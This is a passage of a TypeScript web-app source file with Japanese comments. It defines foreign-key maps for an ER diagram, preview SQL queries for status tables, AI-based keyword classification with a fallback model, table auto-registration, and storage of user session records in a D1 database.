  //  user_sessions.user_id (UNIQUE) が実質的な users テーブル。
  //  workspaces.id (PK) が workspace の権威ソース。
  //  チェーン: user_id → team_members.team_id → teams ← workspaces ← data tables
  // ========================================================================
  user_sessions: { current_workspace_id: 'workspaces' },
  workspaces: { team_id: 'teams' },
  team_members: { team_id: 'teams', user_id: 'user_sessions' },

  // ========================================================================
  // user_id の論理FK（user_sessions.user_id が参照先）
  //  DB制約は張らない（認証基盤との結合度を下げ CASCADE 副作用を避けるため）
  // ========================================================================
  cache_stats: { user_id: 'user_sessions' },
  cloudflare_setup_pending: { user_id: 'user_sessions' },
  commit_search_history: { user_id: 'user_sessions' },
  commit_search_repo_stats: { search_history_id: 'commit_search_history' },
  commit_search_hit_details: { search_history_id: 'commit_search_history' },
  commit_search_keyword_labels: { user_id: 'user_sessions' },

  // ========================================================================
  // workspace_id の論理FK（workspaces.id が参照先）
  // ========================================================================
  commit_calendar_cache: { workspace_id: 'workspaces' },
  commit_list_cache: { workspace_id: 'workspaces' },
  repo_color_settings: { workspace_id: 'workspaces', repo_name: 'installation_permissions' },
  repo_groups: { workspace_id: 'workspaces' },
  repo_group_members: {
    workspace_id: 'workspaces',
    group_id: 'repo_groups',
    repo_name: 'installation_permissions',
  },
  group_oauth_apps: { workspace_id: 'workspaces', group_id: 'repo_groups' },

  // ========================================================================
  // AI 要約ログ関連
  // ========================================================================
  ai_summary_reviews: { summary_request_id: 'ai_summary_log' },
  commit_agent_log: { request_id: 'ai_summary_log' },
  ai_summary_link_access_log: { request_id: 'ai_summary_log' },

  // ========================================================================
  // メール・Webhook 系
  //  target_user_id は異名FK（user_id と意味的に同一 → user_sessions を参照）
  // ========================================================================
  email_send_log: { source_id: 'resend_webhook_sources' },
  resend_webhook_log: { source_id: 'resend_webhook_sources' },
  email_suppression_list: { source_id: 'resend_webhook_sources', origin_webhook_log_id: 'resend_webhook_log' },
  email_mfa_challenges: { source_id: 'resend_webhook_sources', user_id: 'user_sessions' },
  email_audit_anomalies: { source_id: 'resend_webhook_sources', target_user_id: 'user_sessions' },

  // ========================================================================
  // コミットインデックス系
  // ========================================================================
  repo_commit_index: { repo_name: 'installation_permissions' },
  ai_chat_shares: { user_id: 'user_sessions' },
  aichat_search_log: { user_id: 'user_sessions', share_id: 'ai_chat_shares' },
  aichat_search_history: { user_id: 'user_sessions', share_id: 'ai_chat_shares' },
  aichat_search_impressions: { user_id: 'user_sessions', share_id: 'ai_chat_shares' },
  aichat_share_subquery_links: { subquery_id: 'aichat_subqueries' },
  keyword_category_groups: { user_id: 'user_sessions' },
  keyword_multi_labels: { user_id: 'user_sessions' },

  // ========================================================================
  // メタデータ系
  // ========================================================================
  table_column_keys: { table_name: 'table_catalog' },

  // ========================================================================
  // 関数カタログ系 (ts_*)
  // ========================================================================
  ts_function_catalog:    { repo_id: 'ts_repository' },
  ts_commit_log:          { repo_id: 'ts_repository' },
  ts_commit_function_map: { repo_id: 'ts_repository', commit_hash: 'ts_commit_log' },
  ts_function_impact:     { repo_id: 'ts_repository', commit_hash: 'ts_commit_log' },
  ts_commit_quality:      { repo_id: 'ts_repository', commit_hash: 'ts_commit_log' },
};

/**
 * 異名FKの参照先カラム名オーバーライド。
 *
 * キー: `${fromTable}.${fromCol}` / 値: 参照先テーブルの実カラム名。
 * `COLUMN_FK_TARGETS` 側では「参照先テーブル名」しか持てないため、
 * `workspace_id → workspaces.id` のようにカラム名が異なる論理FKでは
 * ここで toCol を明示する必要がある。
 *
 * ここに登録がない場合は fromCol と同名のカラムを参照する（同名FK）。
 */
export const COLUMN_FK_TARGET_COLUMNS: Record<string, string> = {
  // workspace_id 系 → workspaces.id
  'user_sessions.current_workspace_id': 'id',
  'commit_calendar_cache.workspace_id': 'id',
  'commit_list_cache.workspace_id': 'id',
  'repo_color_settings.workspace_id': 'id',
  'repo_groups.workspace_id': 'id',
  'repo_group_members.workspace_id': 'id',
  'group_oauth_apps.workspace_id': 'id',

  // user_id 系 → user_sessions.user_id (UK が権威カラム)
  'team_members.user_id': 'user_id',
  'cache_stats.user_id': 'user_id',
  'cloudflare_setup_pending.user_id': 'user_id',
  'commit_search_history.user_id': 'user_id',
  'commit_search_keyword_labels.user_id': 'user_id',
  'email_mfa_challenges.user_id': 'user_id',
  // 異名FK: target_user_id も意味的には user_id
  'email_audit_anomalies.target_user_id': 'user_id',

  // group_id 系 → repo_groups.id
  'repo_group_members.group_id': 'id',
  'group_oauth_apps.group_id': 'id',

  // source_id 系 → resend_webhook_sources.id
  'email_send_log.source_id': 'id',
  'resend_webhook_log.source_id': 'id',
  'email_suppression_list.source_id': 'id',
  'email_mfa_challenges.source_id': 'id',
  'email_audit_anomalies.source_id': 'id',
  // origin_webhook_log_id → resend_webhook_log.id
  'email_suppression_list.origin_webhook_log_id': 'id',

  // request_id 系 → ai_summary_log.id
  'ai_summary_reviews.summary_request_id': 'id',
  'commit_agent_log.request_id': 'id',
  'ai_summary_link_access_log.request_id': 'id',

  // search_history_id → commit_search_history.id
  'commit_search_repo_stats.search_history_id': 'id',
  'commit_search_hit_details.search_history_id': 'id',

  // team_id → teams.id (物理FKで拾われるので普段は経由しないが保険)
  'workspaces.team_id': 'id',
  'team_members.team_id': 'id',
};

/**
 * 論理FK (`COLUMN_FK_TARGETS`) の参照先カラム名を解決する。
 * `COLUMN_FK_TARGET_COLUMNS` にオーバーライドがあればそれを返し、
 * なければ fromCol と同名のカラムを参照するものとみなす。
 */
export function resolveLogicalFkTargetCol(fromTable: string, fromCol: string): string {
  return COLUMN_FK_TARGET_COLUMNS[`${fromTable}.${fromCol}`] ?? fromCol;
}

/**
 * `table_column_keys` の DB行を `COLUMN_FK_TARGETS` 相当の構造にマージする。
 *
 * 設計上の問題:
 *   `table_column_keys` は部分的にしか同期されていないことがある。
 *   DB に一部のFK行が存在するだけで `base` 全体を置換（OVERRIDE）すると、
 *   DB に登録されていないFK関係が失われ、ER図の矢印が欠ける。
 *
 * この関数は「DB行は base を上書き・補完する」（MERGE）セマンティクスを提供する。
 * DB行が空の場合は base をそのまま返す。
 */
export function mergeFkTargetsFromDb(
  base: Record<string, Record<string, string>>,
  dbRows: { table_name: string; column_name: string; fk_target_table: string }[]
): Record<string, Record<string, string>> {
  if (!dbRows || dbRows.length === 0) return base;
  const merged: Record<string, Record<string, string>> = {};
  for (const [t, cols] of Object.entries(base)) {
    merged[t] = { ...cols };
  }
  for (const row of dbRows) {
    if (!merged[row.table_name]) merged[row.table_name] = {};
    merged[row.table_name][row.column_name] = row.fk_target_table;
  }
  return merged;
}

export function buildGroupErData(
  tableName: string,
  groupMap: Record<string, string>,
  tableDescriptions: Record<string, string>,
  columnKeys: Record<string, ColumnKeyInfo>,
  fkTargets: Record<string, Record<string, string>>,
  pragmaColumnsMap: Record<string, string[]>,
): GroupErData | null {
  const groupName = groupMap[tableName];
  if (!groupName) return null;

  const groupTables = Object.entries(groupMap)
    .filter(([, g]) => g === groupName)
    .map(([t]) => t);

  const tables: GroupErTable[] = groupTables.map((t) => {
    const cols = pragmaColumnsMap[t] ?? [];
    const keys = columnKeys[t] ?? {};
    const fks = fkTargets[t] ?? {};
    return {
      tableName: t,
      description: tableDescriptions[t] ?? '',
      columns: cols.map((c) => ({
        name: c,
        keyType: keys[c] ?? null,
        fkTarget: fks[c] ?? null,
      })),
    };
  });

  return {
    groupName,
    groupLabel: GROUP_LABELS[groupName] ?? groupName,
    groupColor: GROUP_COLORS[groupName] ?? '#8b949e',
    tables,
  };
}

function getStatusTableDefinition(tableName: string): StatusTableDefinition | undefined {
  return getEffectiveStatusTableDefinitions().find((table) => table.name === tableName);
}

function getEffectiveStatusTableDefinitions(): StatusTableDefinition[] {
  const tableMap = new Map<string, StatusTableDefinition>();
  for (const table of STATUS_TABLE_DEFINITIONS) {
    tableMap.set(table.name, table);
  }
  for (const requiredTable of REQUIRED_STATUS_TABLE_DEFINITIONS) {
    if (!tableMap.has(requiredTable.name)) {
      tableMap.set(requiredTable.name, requiredTable);
    }
  }
  return Array.from(tableMap.values());
}

function inferMigrationFromAppliedNames(tableName: string, appliedMigrationNames: string[]): string | null {
  const normalized = tableName.toLowerCase();
  for (const name of appliedMigrationNames) {
    const lower = name.toLowerCase();
    if (!lower.includes(normalized)) continue;
    const match = name.match(/^(\d{4})_/);
    if (match) return match[1];
  }
  return null;
}

function inferGroupFromTableName(tableName: string): string | null {
  const normalized = tableName.toLowerCase();

  if (
    normalized.includes('ai_') ||
    normalized.includes('summary') ||
    normalized.includes('agent_log')
  ) {
    return 'ai';
  }
  if (
    normalized.includes('email') ||
    normalized.includes('resend') ||
    normalized.includes('webhook') ||
    normalized.includes('suppression') ||
    normalized.includes('mfa')
  ) {
    return 'email';
  }
  if (
    normalized.includes('commit') ||
    normalized.includes('cache') ||
    normalized.includes('cloudflare_setup')
  ) {
    return 'commit';
  }
  if (
    normalized.includes('session') ||
    normalized.includes('auth') ||
    normalized.includes('team') ||
    normalized.includes('workspace') ||
    normalized.includes('member')
  ) {
    return 'auth';
  }
  if (
    normalized.includes('repo_') ||
    normalized.includes('installation') ||
    normalized.includes('table_') ||
    normalized.includes('settings') ||
    normalized.includes('config') ||
    normalized.includes('slack_interaction')
  ) {
    return 'config';
  }
  return null;
}

function getStatusTablePreviewQuery(
  tableName: string,
  userId: string,
  workspaceId: string | null,
  teamId: string | null,
): { sql: string; params: (string | number)[] } | null {
  switch (tableName) {
    case 'user_sessions':
      return {
        sql: `SELECT * FROM ${tableName} WHERE user_id = ? ORDER BY updated_at DESC, id DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [userId],
      };
    case 'commit_calendar_cache':
    case 'commit_list_cache':
      if (!workspaceId) return null;
      return {
        sql: `SELECT * FROM ${tableName} WHERE workspace_id = ? ORDER BY cached_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [workspaceId],
      };
    case 'cache_stats':
      return {
        sql: `SELECT * FROM ${tableName} WHERE user_id = ? ORDER BY last_updated_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [userId],
      };
    case 'teams':
      if (!teamId) return null;
      return {
        sql: `SELECT * FROM ${tableName} WHERE id = ? ORDER BY created_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [teamId],
      };
    case 'workspaces':
      if (!teamId) return null;
      return {
        sql: `SELECT * FROM ${tableName} WHERE team_id = ? ORDER BY created_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [teamId],
      };
    case 'team_members':
      if (!teamId) return null;
      return {
        sql: `SELECT * FROM ${tableName} WHERE team_id = ? ORDER BY joined_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [teamId],
      };
    case 'installation_permissions':
      return {
        sql: `SELECT * FROM ${tableName} ORDER BY updated_at DESC, id DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'repo_color_settings':
      if (!workspaceId) return null;
      return {
        sql: `SELECT * FROM ${tableName} WHERE workspace_id = ? ORDER BY display_order ASC, repo_name ASC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [workspaceId],
      };
    case 'repo_groups':
      if (!workspaceId) return null;
      return {
        sql: `SELECT * FROM ${tableName} WHERE workspace_id = ? ORDER BY display_order ASC, name ASC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [workspaceId],
      };
    case 'repo_group_members':
      if (!workspaceId) return null;
      return {
        sql: `SELECT * FROM ${tableName} WHERE workspace_id = ? ORDER BY repo_name ASC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [workspaceId],
      };
    case 'ai_summary_log':
      return {
        sql: `SELECT * FROM ${tableName} ORDER BY created_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'ai_summary_reviews':
      return {
        sql: `SELECT r.*, l.repo_full_name, l.pr_number FROM ai_summary_reviews r JOIN ai_summary_log l ON l.request_id = r.summary_request_id ORDER BY r.created_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'commit_agent_log':
      return {
        sql: `SELECT * FROM ${tableName} ORDER BY created_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'resend_webhook_sources':
      return {
        sql: `SELECT * FROM ${tableName} ORDER BY created_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'email_send_log':
      return {
        sql: `SELECT * FROM ${tableName} ORDER BY created_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'resend_webhook_log':
      return {
        sql: `SELECT w.*, s.label AS source_label FROM resend_webhook_log w LEFT JOIN resend_webhook_sources s ON s.id = w.source_id ORDER BY w.created_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'email_suppression_list':
      return {
        sql: `SELECT * FROM ${tableName} ORDER BY suppressed_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'email_mfa_challenges':
      return {
        sql: `SELECT * FROM ${tableName} ORDER BY created_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'email_audit_anomalies':
      return {
        sql: `SELECT * FROM ${tableName} ORDER BY created_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'slack_interaction_log':
      return {
        sql: `SELECT * FROM ${tableName} ORDER BY created_at DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'table_catalog':
      return {
        sql: `SELECT * FROM ${tableName} ORDER BY display_order ASC, table_name ASC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'table_column_keys':
      return {
        sql: `SELECT ck.*, tc.group_name FROM table_column_keys ck JOIN table_catalog tc ON tc.table_name = ck.table_name ORDER BY ck.table_name ASC, ck.column_name ASC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'repo_commit_index':
      return {
        sql: `SELECT * FROM ${tableName} ORDER BY seq_num DESC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [],
      };
    case 'commit_search_keyword_labels':
      return {
        sql: `SELECT * FROM ${tableName} WHERE user_id = ? ORDER BY label ASC, search_query ASC LIMIT ${STATUS_TABLE_PREVIEW_LIMIT}`,
        params: [userId],
      };
    default:
      return null;
  }
}

export function buildKeywordClassificationPrompt(keyword: string, labels: string[]): string {
  return `次の検索キーワードを、以下のカテゴリのいずれか1つに分類してください。複数のカテゴリに該当する場合でも、最も適切な1つだけ返してください。\nカテゴリ: ${labels.join(', ')}\nキーワード: "${keyword}"\nカテゴリ名のみを返してください。他の文字を含めないでください。`;
}

export function pickBestLabelFromResponse(raw: string, labels: string[]): string {
  const matched = labels.filter((l) => raw.includes(l));
  if (matched.length === 0) return 'uncategorized';
  if (matched.length === 1) return matched[0];
  return matched.reduce((best, l) => raw.indexOf(l) < raw.indexOf(best) ? l : best);
}

/**
 * AI自動分類の再試行が必要かどうかを判定する。
 * classify_status が 'ai_success' の場合は AI が正常終了済みとみなし再分類しない。
 * タイムアウト・フォールバック使用時(ai_fallback)は再試行対象とする。
 */
export function shouldReclassifyKeyword(
  row: { label: string; classify_status?: string | null } | null | undefined
): boolean {
  if (!row) return false;
  if (row.label !== 'uncategorized') return false;
  if (row.classify_status === 'ai_success') return false;
  return true;
}

/** デフォルトカテゴリとDBから取得したユーザー定義カテゴリをマージし重複除去して返す */
export const DEFAULT_KEYWORD_LABELS = ['feature', 'ui', 'tech', 'database', 'bugfix', 'ops', 'uncategorized'] as const;

export function mergeAllCategories(dbLabels: string[]): string[] {
  const defaults = [...DEFAULT_KEYWORD_LABELS] as string[];
  const merged = [...new Set([...defaults, ...dbLabels.filter((l) => l && l !== 'uncategorized')])];
  // uncategorized を末尾に固定
  if (!merged.includes('uncategorized')) merged.push('uncategorized');
  else {
    const idx = merged.indexOf('uncategorized');
    merged.splice(idx, 1);
    merged.push('uncategorized');
  }
  return merged;
}

export function resolveKeywordDisplayLabels(
  multiCategories: string[] | null | undefined,
  singleLabel: string
): string[] {
  if (Array.isArray(multiCategories) && multiCategories.length > 0) return multiCategories;
  return [singleLabel || 'uncategorized'];
}

export function extractAiUsage(raw: Record<string, unknown> | null | undefined): {
  input_tokens: number | null;
  output_tokens: number | null;
  total_tokens: number | null;
} {
  const u = (typeof raw === 'object' && raw !== null) ? raw : {};
  const num = (v: unknown): number | null => (typeof v === 'number' ? v : null);
  const it = num(u['input_tokens']) ?? num(u['prompt_tokens']);
  const ot = num(u['output_tokens']) ?? num(u['completion_tokens']);
  const tt = num(u['total_tokens']) ?? (it !== null && ot !== null ? it + ot : null);
  return { input_tokens: it, output_tokens: ot, total_tokens: tt };
}

interface ClassifyResult {
  label: string;
  prompt: string;
  rawResponse: string;
  model: string;
  fallback?: {
    model: string;
    rawResponse: string;
    label: string;
  };
}

async function classifyKeywordWithAI(
  ai: Ai,
  model: string,
  keyword: string,
  labels: string[],
): Promise<ClassifyResult> {
  const prompt = buildKeywordClassificationPrompt(keyword, labels);
  const runAi = async (m: string): Promise<string> => {
    const call = (async () => {
      const result = await (ai as unknown as { run: (model: string, opts: Record<string, unknown>) => Promise<{ response?: string }> }).run(m, {
        messages: [{ role: 'user', content: prompt }],
        max_tokens: 20,
      });
      return (result?.response ?? '').trim();
    })();
    return withAiTimeout(call, AI_CLASSIFY_TIMEOUT_MS);
  };

  const rawResponse = await runAi(model);
  if (rawResponse !== '') {
    const label = pickBestLabelFromResponse(rawResponse.toLowerCase(), labels);
    return { label, prompt, rawResponse, model };
  }

  // プライマリモデルが空レスポンス → フォールバックモデルで再試行
  const fallbackModel = FALLBACK_AI_MODEL;
  const fallbackRaw = await runAi(fallbackModel);
  const fallbackLabel = pickBestLabelFromResponse(fallbackRaw.toLowerCase(), labels);
  return {
    label: fallbackLabel,
    prompt,
    rawResponse,
    model,
    fallback: { model: fallbackModel, rawResponse: fallbackRaw, label: fallbackLabel },
  };
}

export function buildPreviewQueryFromTemplate(
  template: string,
  userId: string,
  workspaceId: string | null,
  teamId: string | null,
): { sql: string; params: string[] } {
  const params: string[] = [];
  const replacements: Record<string, string> = {
    USER_ID: userId,
    WORKSPACE_ID: workspaceId ?? '',
    TEAM_ID: teamId ?? '',
  };
  const sql = template.replace(/\{(USER_ID|WORKSPACE_ID|TEAM_ID)\}/g, (_match, key: string) => {
    params.push(replacements[key]);
    return '?';
  });
  return { sql, params };
}

async function autoRegisterTablesFromSqliteMaster(
  db: D1Database,
  appliedMigrationNames: string[],
): Promise<void> {
  const sqliteResult = await db.prepare(
    "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name NOT LIKE '_cf_%' AND name NOT LIKE 'd1_%'"
  ).all<{ name: string }>();
  const allTables = (sqliteResult.results ?? []).map((r) => r.name).filter(Boolean);

  const catalogResult = await db.prepare('SELECT table_name FROM table_catalog').all<{ table_name: string }>();
  const registered = new Set((catalogResult.results ?? []).map((r) => r.table_name));

  const unregistered = allTables.filter((name) => !registered.has(name));
  if (unregistered.length === 0) return;

  const maxOrderRow = await db.prepare('SELECT MAX(display_order) AS m FROM table_catalog').first<{ m: number | null }>();
  let nextOrder = (maxOrderRow?.m ?? 0) + 1;

  for (const tableName of unregistered) {
    const inferredMigration = inferMigrationFromAppliedNames(tableName, appliedMigrationNames) ?? 'unknown';
    const inferredGroup = inferGroupFromTableName(tableName) ?? 'config';
    let previewSql = `SELECT * FROM ${tableName} LIMIT 20`;
    let pkColumn: string | null = null;
    try {
      const pragma = await db.prepare(`PRAGMA table_info(${tableName})`).all<{ name: string; pk: number }>();
      const cols = (pragma.results ?? []).map((c) => c.name);
      pkColumn = (pragma.results ?? []).find((c) => c.pk > 0)?.name ?? null;
      const hasUserId = cols.includes('user_id');
      const hasCreatedAt = cols.includes('created_at');
      const hasId = cols.includes('id');
      const whereClause = hasUserId ? ` WHERE user_id = {USER_ID}` : '';
      const orderClause = hasCreatedAt ? ' ORDER BY created_at DESC' : hasId ? ' ORDER BY id DESC' : '';
      previewSql = `SELECT * FROM ${tableName}${whereClause}${orderClause} LIMIT 20`;
    } catch {
      // PRAGMA 失敗時はデフォルトのまま
    }
    try {
      await db
        .prepare(
          `INSERT OR IGNORE INTO table_catalog (table_name, group_name, description, migration, sync_policy, display_order, preview_sql) VALUES (?, ?, ?, ?, 'auto', ?, ?)`,
        )
        .bind(tableName, inferredGroup, tableName, inferredMigration, nextOrder, previewSql)
        .run();
      nextOrder++;
    } catch {
      // preview_sql カラムが存在しない等のエラーは無視
    }
    if (pkColumn) {
      try {
        await db
          .prepare(`INSERT OR IGNORE INTO table_column_keys (table_name, column_name, key_type) VALUES (?, ?, 'pk')`)
          .bind(tableName, pkColumn)
          .run();
      } catch {
        // table_column_keys が存在しない場合は無視
      }
    }
  }
}

function getStatusTableQueryExample(tableName: string): StatusQueryExample | null {
  switch (tableName) {
    case 'user_sessions':
      return {
        sql: `SELECT * FROM user_sessions
WHERE user_id = ?
ORDER BY updated_at DESC, id DESC
LIMIT 20;`,
        params: ['user.sub'],
        note: '現在のログインユーザー自身のセッション設定を新しい順で取得します。',
      };
    case 'installation_permissions':
      return {
        sql: `SELECT * FROM installation_permissions
ORDER BY updated_at DESC, id DESC
LIMIT 20;`,
        params: [],
        note: 'インストール権限キャッシュを更新日時の新しい順で取得します。',
      };
    case 'commit_calendar_cache':
      return {
        sql: `SELECT * FROM commit_calendar_cache
WHERE workspace_id = ?
ORDER BY cached_at DESC
LIMIT 20;`,
        params: ['currentWorkspaceId'],
        note: '現在ワークスペースに紐づく月別コミットキャッシュを最新順で取得します。',
      };
    case 'teams':
      return {
        sql: `SELECT * FROM teams
WHERE id = ?
ORDER BY created_at DESC
LIMIT 20;`,
        params: ['currentTeamId'],
        note: '現在所属チームの定義を取得します。',
      };
    case 'workspaces':
      return {
        sql: `SELECT * FROM workspaces
WHERE team_id = ?
ORDER BY created_at DESC
LIMIT 20;`,
        params: ['currentTeamId'],
        note: '現在所属チーム配下のワークスペースを作成順で取得します。',
      };
    case 'team_members':
      return {
        sql: `SELECT * FROM team_members
WHERE team_id = ?
ORDER BY joined_at DESC
LIMIT 20;`,
        params: ['currentTeamId'],
        note: '現在所属チームのメンバー一覧を参加日時の新しい順で取得します。',
      };
    case 'commit_list_cache':
      return {
        sql: `SELECT * FROM commit_list_cache
WHERE workspace_id = ?
ORDER BY cached_at DESC
LIMIT 20;`,
        params: ['currentWorkspaceId'],
        note: '現在ワークスペースに紐づく日別コミット一覧キャッシュを最新順で取得します。',
      };
    case 'cache_stats':
      return {
        sql: `SELECT * FROM cache_stats
WHERE user_id = ?
ORDER BY last_updated_at DESC
LIMIT 20;`,
        params: ['user.sub'],
        note: '現在のログインユーザーに紐づくキャッシュ統計を更新日時順で取得します。',
      };
    case 'repo_color_settings':
      return {
        sql: `SELECT * FROM repo_color_settings
WHERE workspace_id = ?
ORDER BY display_order ASC, repo_name ASC
LIMIT 20;`,
        params: ['currentWorkspaceId'],
        note: '現在ワークスペースに紐づくリポジトリ色設定を表示順で取得します。',
      };
    case 'repo_groups':
      return {
        sql: `SELECT * FROM repo_groups
WHERE workspace_id = ?
ORDER BY display_order ASC, name ASC
LIMIT 20;`,
        params: ['currentWorkspaceId'],
        note: '現在ワークスペースに紐づくリポジトリグループを表示順で取得します。',
      };
    case 'repo_group_members':
      return {
        sql: `SELECT gm.*, g.name AS group_name
FROM repo_group_members gm
JOIN repo_groups g ON g.id = gm.group_id
WHERE gm.workspace_id = ?
ORDER BY g.display_order ASC, gm.repo_name ASC
LIMIT 20;`,
        params: ['currentWorkspaceId'],
        note: '現在ワークスペースに紐づくリポジトリグループメンバーをグループ順で取得します。',
      };
    case 'ai_summary_log':
      return {
        sql: `SELECT * FROM ai_summary_log
ORDER BY created_at DESC
LIMIT 20;`,
        params: [],
        note: 'AI要約ログを作成日時の新しい順で取得します。',
      };
    case 'ai_summary_reviews':
      return {
        sql: `SELECT r.*, l.repo_full_name, l.pr_number
FROM ai_summary_reviews r
JOIN ai_summary_log l ON l.request_id = r.summary_request_id
ORDER BY r.created_at DESC
LIMIT 20;`,
        params: [],
        note: 'AI要約レビューをレビュー一覧から作成日時の新しい順で取得します。',
      };
    case 'commit_agent_log':
      return {
        sql: `SELECT * FROM commit_agent_log
ORDER BY created_at DESC
LIMIT 20;`,
        params: [],
        note: 'コミットエージェント検出ログを作成日時の新しい順で取得します。',
      };
    case 'resend_webhook_sources':
      return {
        sql: `SELECT * FROM resend_webhook_sources
ORDER BY created_at DESC
LIMIT 20;`,
        params: [],
        note: 'Resend Webhook 送信元定義を作成日時の新しい順で取得します。',
      };
    case 'email_send_log':
      return {
        sql: `SELECT * FROM email_send_log
ORDER BY created_at DESC
LIMIT 20;`,
        params: [],
        note: 'メール送信ログを送信日時の新しい順で取得します。',
      };
    case 'resend_webhook_log':
      return {
        sql: `SELECT w.*, s.label AS source_label FROM resend_webhook_log w LEFT JOIN resend_webhook_sources s ON s.id = w.source_id ORDER BY w.created_at DESC LIMIT 20;`,
        params: [],
        note: 'Resend Webhook 受信ログを受信日時の新しい順で取得します。source_label は送信元定義の名前です。',
      };
    case 'email_suppression_list':
      return {
        sql: `SELECT * FROM email_suppression_list
ORDER BY suppressed_at DESC
LIMIT 20;`,
        params: [],
        note: 'メール配信停止リストを停止日時の新しい順で取得します。',
      };
    case 'email_mfa_challenges':
      return {
        sql: `SELECT * FROM email_mfa_challenges
ORDER BY created_at DESC
LIMIT 20;`,
        params: [],
        note: 'メールMFA認証チャレンジを作成日時の新しい順で取得します。',
      };
    case 'email_audit_anomalies':
      return {
        sql: `SELECT * FROM email_audit_anomalies
ORDER BY created_at DESC
LIMIT 20;`,
        params: [],
        note: 'メール監査異常検知レコードを検知日時の新しい順で取得します。',
      };
    case 'slack_interaction_log':
      return {
        sql: `SELECT * FROM slack_interaction_log
ORDER BY created_at DESC
LIMIT 20;`,
        params: [],
        note: 'Slack操作ログを新しい順で取得します。',
      };
    case 'repo_commit_index':
      return {
        sql: `SELECT * FROM repo_commit_index
ORDER BY seq_num DESC
LIMIT 20;`,
        params: [],
        note: 'コミットインデックスを通し番号の新しい順（最新コミット優先）で取得します。',
      };
    case 'commit_search_keyword_labels':
      return {
        sql: `SELECT * FROM commit_search_keyword_labels
WHERE user_id = ?
ORDER BY label ASC, search_query ASC
LIMIT 20;`,
        params: ['user.sub'],
        note: '検索キーワードのラベル分類を label 順・キーワード順で取得します。',
      };
    default:
      return null;
  }
}

function getJstYearMonthParts(date: Date): { year: number; month: number } {
  const formatter = new Intl.DateTimeFormat('ja-JP', {
    timeZone: 'Asia/Tokyo',
    year: 'numeric',
    month: '2-digit',
  });
  const parts = formatter.formatToParts(date);
  let year = date.getUTCFullYear();
  let month = date.getUTCMonth() + 1;
  for (const part of parts) {
    if (part.type === 'year') year = parseInt(part.value, 10);
    if (part.type === 'month') month = parseInt(part.value, 10);
  }
  return { year, month };
}

// セッション有効期限の文字列を秒数に変換するヘルパー関数
// D1データベースにユーザーセッション情報を保存または更新
async function updateUserSession(
  db: D1Database | undefined,
  userId: string,
  timezone: string,
  sessionDuration: string,
  githubAccessToken?: string,
  githubGrantedScopes?: string
): Promise<{ saved: boolean; lastLoginAt: string | null }> {
  if (!db) {
    logger.warn('D1 database not available, skipping session update', { userId });
    return { saved: false, lastLoginAt: null };
  }

  const now = new Date().toISOString();

  try {
    // github_granted_scopes カラムがなければ追加（マイグレーション互換）
    try {
      await db.prepare('ALTER TABLE user_sessions ADD COLUMN github_granted_scopes TEXT').run();
    } catch {
      // カラムが既にある場合は無視
    }

    // 前回ログイン日時を取得（UPSERT 前に取得する必要がある）
    const existing = await db.prepare(
      'SELECT current_login_at FROM user_sessions WHERE user_id = ?'
    ).bind(userId).first<{ current_login_at: string }>();
    const lastLoginAt = existing?.current_login_at ?? null;

    // UPSERT: INSERT ... ON CONFLICT で競合状態を解消
    // 同一ユーザーの同時ログインでも UNIQUE 制約違反にならない
    await db.prepare(`
      INSERT INTO user_sessions (user_id, timezone, session_duration, last_login_at, current_login_at, updated_at, github_access_token, github_granted_scopes)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT (user_id) DO UPDATE SET
        timezone = excluded.timezone,
        session_duration = excluded.session_duration,
        last_login_at = excluded.last_login_at,
        current_login_at = excluded.current_login_at,
        updated_at = excluded.updated_at,
        github_access_token = excluded.github_access_token,
        github_granted_scopes = excluded.github_granted_scopes
    `).bind(userId, timezone, sessionDuration, lastLoginAt, now, now, githubAccessToken ?? null, githubGrantedScopes ?? null).run();

    return { saved: true, lastLoginAt };
  } catch (error) {
    logger.error('Error updating user session', {
      userId,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return { saved: false, lastLoginAt: null };
  }
}

// D1データベースからユーザーセッション情報を取得
async function getUserSession(db: D1Database | undefined, userId: string): Promise<{
  timezone: string;
  sessionDuration: string;
  lastLoginAt: string | null;
  githubAccessToken?: string | null;
  githubGrantedScopes?: string | null;
} | null> {
  if (!db) {
    return null;
  }

  try {
    const result = await db.prepare(
      'SELECT timezone, session_duration, last_login_at, github_access_token, github_granted_scopes FROM user_sessions WHERE user_id = ?'
    ).bind(userId).first<{
      timezone: string;
      session_duration: string;
      last_login_at: string | null;
      github_access_token: string | null;
      github_granted_scopes: string | null;
    }>();

    if (!result) {
      return null;
    }

    return {
      timezone: result.timezone,
      sessionDuration: result.session_duration,
